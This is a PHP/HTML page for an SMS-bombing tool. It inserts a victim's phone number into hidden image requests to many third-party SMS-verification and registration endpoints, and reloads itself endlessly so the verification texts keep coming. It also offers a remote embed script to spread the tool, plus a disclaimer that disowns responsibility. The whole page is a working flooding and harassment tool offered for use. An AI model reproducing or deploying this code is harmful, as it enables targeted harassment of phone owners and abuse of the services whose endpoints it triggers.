
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<link rel="stylesheet" href="css.css" type="text/css"/>
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
</style>
<title>短信炸弹</title>
</head>
<body>

<div class="container">
<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">本站允许使用开发接口，永久免费！[V1.2]<span class="label label-success" style="float: right;" onclick="window.open('http://blog.0907.org', '_new')"><strong>由无名强力驱动</strong></span></h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">+86</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="输入需要轰炸的号码" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸线程</button>
		<button type="button" class="btn btn-success" onclick="top.location='index.php'">停止轰炸线程</button>
        <button type="button" class="btn btn-warning" target="_blank" onclick="top.location='http://blog.0907.org/sms/wd'">启动无敌模式</button>
		</div>
		</form>
<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a;
$d=$_GET['hm'];
?>
<div class="tip">
<?php
$i=16631150870;//想要屏蔽的手机号
if($i==$d){
   echo "<br><br><H4>本手机号禁止发送垃圾短信</H4>";
}
if($i!=$d and $d>1){
    echo"   <br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div></div><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>短信轰炸已启动,  对<strong>$d</strong>,已经发起<strong>$e</strong>波短信轰炸,请静静的等待几秒钟查看效果</div></div>";
    echo "<div style='display:none'>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://t.12580.com/special/sendValidcodeByWap.do?mobile=$d&valicode=' alt=''/>
<img src='http://my.tv.sohu.com/user/reg/getmstatus.do?passport=$d' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/k961601363512388' alt=''/>
<img src='http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=$d&isCheckCode=1' alt=''/>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://www.skywldh.com/registerForMobileForCode.act?mobileNo=$d&smSecurityCode=' alt=''/>
<img src='http://wap.skywldh.com/index.php?register&flag=flag&phone=$d&mss=on' alt=''/>
<img src='http://zg51.net/web/customer/forgetPwd_up.asp?customermobile=$d&verify=01f735f97f1af959&checkcodeflag=1' alt=''/>
<img src='http://www.qqvoice.com/free/getExpCode.do?_isAjaxRequest=true&phonemail=$d&type=1&randvalue=' alt=''/>
<img src='http://www.feiin.com/findAsidountInfoByAsidount.act?mobile=$d' alt=''/>
<img src='http://wap.feiin.cn/index.php?register?phone=$d' alt=''/>
<img src='http://www.feiin.cn/bindMobileCode.act?asidount=$d&quhao=0086' alt=''/>
<img src='http://hm.baidu.com/hm.gif?cc=1&ck=1&cl=16-bit&ds=1280x800&ep=%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81*%E7%82%B9%E5%87%BB&et=4&fl=11.6&ja=1&ln=zh-cn&lo=0&nv=1&rnd=2125197633&si=4cd143d67831005438c65f586314c582&st=3&su=' alt=''/>
</div>";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$d&amp;c=$a'>";
}

?>
<div class="bs-callout bs-callout-danger">
    <h4>法律声明</h4>
    <p>当您提交手机号码后, 本程序会产生很多的验证码发送到您所输入的手机号里。此操作所产生的任何后果或者不良影响本站概不负责！<br />换个角度来讲，我们只是在制造枪并给你用, 至于你怎么用这把枪是你的事情. 本站不承担因您使用本网站所提供的功能造成间接或直接的损失. </p>
</div>
<div class="bs-callout bs-callout-success">
    <h4>开发接口</h4>
    <p>
        您可以使用下面的代码将 <a href="http://blog.0907.org/sms/mini">迷你轰炸台</a> 嵌入到网站中
        <pre>&lt;script src="http://blog.0907.org/sms/api/"&gt;&lt;/script&gt;</pre>
    </p>
</div>
</div>
</body>
</html>